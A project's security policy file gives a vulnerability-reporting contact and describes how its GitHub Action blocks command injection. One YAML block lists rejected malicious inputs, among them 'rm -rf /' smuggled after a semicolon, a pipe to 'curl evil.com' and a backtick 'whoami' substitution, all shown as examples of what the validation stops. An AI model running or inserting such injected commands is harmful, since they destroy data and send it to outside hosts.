# Security Policy

## Reporting Security Issues

We appreciate your efforts to responsibly disclose your findings, and will make every effort to acknowledge your contributions.

## Reporting a Vulnerability

To report a security issue, please contact us at [security-oss@shivasurya.me][1].

We will send a response indicating the next steps in handling your report. After the initial reply to your report, the security team will keep you informed of the progress towards a fix and full announcement, and may ask for additional information or guidance.

[1]: mailto:security-oss@shivasurya.me

## GitHub Action Security

The Code Pathfinder GitHub Action (`action.yml`) implements multiple layers of defense against command injection vulnerabilities:

### Security Controls

1. **Input Validation**
   - All user inputs validated before use
   - Blocks dangerous shell metacharacters: `;` `|` `&` `$` `` ` `` and newlines
   - Fails fast with clear error messages

2. **Array-Based Argument Construction**
   - Uses bash arrays instead of string concatenation
   - Proper quoting with `"${ARGS[@]}"` prevents word splitting
   - Eliminates unquoted variable expansion attacks

3. **Shell Safety Options**
   - Runs with `set -euo pipefail`
   - Exits immediately on errors
   - Fails on undefined variables

4. **No Code Evaluation**
   - Never uses `eval`, `source`, or indirect expansion
   - No user input is executed as code
   - Static command structure only

### Example Blocked Attacks

```yaml
# ❌ These malicious inputs will be rejected:
with:
  project: ". ; rm -rf /"           # Command injection
  rules: "rules.py | curl evil.com" # Pipe to exfiltration
  fail-on: "critical & backdoor"    # Background execution
  output-file: "r.sarif`whoami`"    # Command substitution
```

### Best Practices

- Pin actions to specific versions: `@v1.2.0` not `@main`
- Review action execution logs
- Use minimal GitHub token permissions

Last security audit: January 2026
